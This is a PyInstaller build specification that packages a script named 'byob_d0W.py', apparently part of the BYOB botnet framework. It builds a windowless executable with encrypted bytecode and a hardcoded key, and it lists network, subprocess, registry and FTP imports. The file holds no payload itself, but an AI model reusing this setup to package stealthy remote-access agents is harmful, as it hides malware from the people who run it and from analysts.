# -*- mode: python -*-
block_cipher = pyi_crypto.PyiBlockCipher(key='R<mPePTL8KzM<eNq')
a = Analysis(['byob_d0W.py'],
             pathex=['/Users/ppete/Documents/byob/byob'],
             binaries=[],
             datas=[],
             hiddenimports=['json', 'base64', 'urllib', 'marshal', 'zlib', 'sys', 'socket', 'uuid', 'base64', 'time', 'threading', 'subprocess', 'copy', 'logging', 'ctypes', 'os', 'sys', 'requests', 'StringIO', 'collections', 'zlib', '_winreg', 'colorama', 'json', 'errno', 'hashlib', 'random', 'struct', 'functools', 'ftplib', 'zipfile', 'numpy'],
             hookspath=[],
             runtime_hooks=[],
             excludes=['site'],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher)
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          name='byob_d0W',
          debug=False,
          strip=False,
          upx=False,
          runtime_tmpdir=None,
          console=False, icon=None)
